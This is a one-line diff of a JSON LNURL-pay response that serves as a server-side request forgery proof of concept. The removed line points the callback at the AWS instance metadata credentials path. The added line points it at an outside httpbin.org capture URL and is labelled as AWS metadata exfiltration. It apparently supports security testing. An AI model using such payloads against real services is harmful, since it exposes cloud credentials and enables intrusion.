@@ -1,1 +1,1 @@
-{"callback":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","maxSendable":1000000000,"minSendable":1000,"tag":"payRequest","metadata":"[[\"text/plain\",\"SSRF test - IMDS callback\"]]","commentAllowed":255}
+{"callback":"https://httpbin.org/anything/amboss_ssrf_callback","maxSendable":1000000000,"minSendable":1000,"tag":"payRequest","metadata":"[[\"text/plain\",\"IMDS SSRF PoC - AWS metadata exfiltration\"],[\"text/identifier\",\"169.254.169.254\"]]","commentAllowed":255}
